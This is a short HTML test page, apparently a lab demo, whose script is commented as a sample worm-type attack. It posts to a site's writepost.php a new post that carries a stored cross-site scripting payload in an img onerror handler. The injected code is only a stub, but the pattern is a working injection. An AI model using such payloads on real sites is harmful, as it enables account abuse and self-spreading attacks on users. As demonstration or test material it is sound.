<!doctype html>
<html>
<body>
	<h1>Testing!</h1>
	<script type="text/javascript">
		// Sample worm type attack
		var xhttp = new XMLHttpRequest();
		xss = "var xhttp2 = new XMLHttpRequest(); ";

		xhttp.open("POST", "./writepost.php", true);
		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		xhttp.send("newpost=<img src='x' onerror='"+xss+"' alt='xss'>");

		</script>
</body>

